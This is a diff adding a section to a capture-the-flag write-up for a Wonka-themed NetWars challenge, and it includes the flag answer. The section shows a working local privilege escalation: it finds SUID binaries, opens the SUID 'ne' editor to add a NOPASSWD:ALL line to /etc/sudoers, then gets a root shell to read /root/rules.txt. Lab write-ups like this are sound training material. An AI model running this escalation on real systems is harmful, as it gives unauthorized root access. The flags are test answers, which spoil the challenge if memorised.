@@ -494,3 +494,30 @@ Decode as Base64 > Decode as URL
 NetWars{ItHappensEveryTimeTheyAllBecomeBlueberries}
 ```
 ________________________________________________________________________________________________________________________________________
+**Q5 - OFF WE GO**
+
+We've sewn a secret path to root privileges in your workstation with a SUID 0 setting on an executable.
+Exploit this escalation path and cat the file located at /root/rules.txt .
+
+
+**A5 - 'NetWars{NoTouchingNoMeddlingNoTasting}'**
+```
+contestwinner@oompa-loompa:~/inventingroom$ find / -perm -4000 2>/dev/null
+/usr/lib/dbus-1.0/dbus-daemon-launch-helper
+/usr/lib/eject/dmcrypt-get-device
+/usr/lib/snapd/snap-confine
+/usr/lib/policykit-1/polkit-agent-helper-1
+/usr/lib/openssh/ssh-keysign
+/usr/bin/ne
+
+contestwinner@oompa-loompa:~/inventingroom$ ne
+Press Escape > Now open a new file > Select /etc/sudoers > and add the following under root
+contestwinner ALL=(ALL) NOPASSWD:ALL
+Now save the /etc/sudoer file
+contestwinner@oompa-loompa:~/inventingroom$ sudo /bin/bash
+root@oompa-loompa:~/inventingroom# cat /root/rules.txt 
+NetWars{NoTouchingNoMeddlingNoTasting}
+root@oompa-loompa:~/inventingroom# 
+
+```
+________________________________________________________________________________________________________________________________________
